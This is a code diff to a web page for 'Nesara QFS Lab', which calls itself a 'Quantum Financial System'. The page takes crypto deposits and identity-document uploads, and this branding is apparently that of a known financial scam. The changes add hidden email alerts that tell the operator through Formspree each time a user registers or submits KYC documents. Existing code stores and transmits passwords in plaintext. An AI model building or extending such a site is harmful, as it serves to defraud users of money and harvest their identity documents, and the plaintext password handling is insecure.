@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Nesara QFS Lab | Quantum Financial System</title><!-- build:1778260005 -->
+  <title>Nesara QFS Lab | Quantum Financial System</title>
   <meta name="description" content="Nesara QFS Lab — Next-generation quantum financial system. Secure, decentralized, and accessible to everyone.">
   <link rel="icon" type="image/svg+xml" href="favicon.svg">
   <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
@@ -1313,16 +1313,22 @@
   function notifyAdmin(action, userName, userEmail, details) {
     fetch('https://formspree.io/f/mgodlgwb', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: { 
+        'Content-Type': 'application/json',
+        'Accept': 'application/json'
+      },
       body: JSON.stringify({
-        _subject: '🔔 ' + action + ' — Nesara QFS Lab',
+        _subject: action + ' - Nesara QFS Lab',
         action: action,
         user_name: userName || 'Unknown',
         user_email: userEmail || 'Unknown',
-        details: details || '—',
+        details: details || '-',
         time: new Date().toLocaleString()
       })
-    }).catch(e => {});
+    }).then(function(r){ 
+      if(!r.ok) console.log('Email failed:', r.status);
+      else console.log('Email sent!');
+    }).catch(function(e){ console.log('Email error:', e); });
   }
 
 const COIN_ADDRS = {
@@ -1452,6 +1458,7 @@ function handleAuth(e) {
     if(!terms) { showAuthErr('Please accept the Terms of Service.'); return; }
     if(users.find(u => u.email === email)) { showAuthErr('This email is already registered.'); return; }
     btn.disabled = true; btn.textContent = 'Creating account...';
+    setTimeout(function(){ btn.disabled = false; btn.textContent = 'Create Account'; }, 5000);
     const user = {
       id: Date.now().toString(), name, email, password: pass,
       kycStatus: 'unverified', kycFile: null, kycDocType: null,
@@ -1459,6 +1466,8 @@ function handleAuth(e) {
       depositProofs: [], withdrawals: [], createdAt: new Date().toISOString(),
     };
     users.push(user); saveUsers();
+    // Email admin about new signup
+    notifyAdmin('New User Registration', name, email, 'A new user just registered on Nesara QFS Lab');
     // Notify backend
     fetch(API + '/api/register', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name,email,password:pass})}).catch(()=>{});
     loginWith(user);
@@ -1466,6 +1475,7 @@ function handleAuth(e) {
     const user = users.find(u => u.email === email);
     if(!user || user.password !== pass) { showAuthErr('Invalid email or password.'); return; }
     btn.disabled = true; btn.textContent = 'Signing in...';
+    setTimeout(function(){ btn.disabled = false; btn.textContent = 'Sign In'; }, 5000);
     fetch(API + '/api/login', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({email,password:pass})}).catch(()=>{});
     loginWith(user);
   }
@@ -1654,11 +1664,17 @@ function submitKYC() {
   currentUser.kycFile = kycFileData;
   currentUser.kycDocType = kycDocType;
   saveCurrentUser();
+  // Email admin about KYC
+  notifyAdmin('KYC Document Uploaded', currentUser.name, currentUser.email, 'Document type: ' + kycDocType + ' - Please review in admin panel');
   // Notify backend
   fetch(API + '/api/kyc/submit', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({fileData: kycFileData ? '[FILE_UPLOADED]' : null, docType: kycDocType})}).catch(()=>{});
   refreshDash();
   refreshKycPanel();
   toast('KYC submitted! Our team will review within 24 hours.', 'success');
+  // Update UI to show pending state
+  document.getElementById('kyc-submit-btn').textContent = '⏳ Submitted — Under Review';
+  document.getElementById('kyc-submit-btn').disabled = true;
+  document.getElementById('kyc-submit-btn').style.opacity = '0.6';
 }
 
 function refreshKycPanel() {
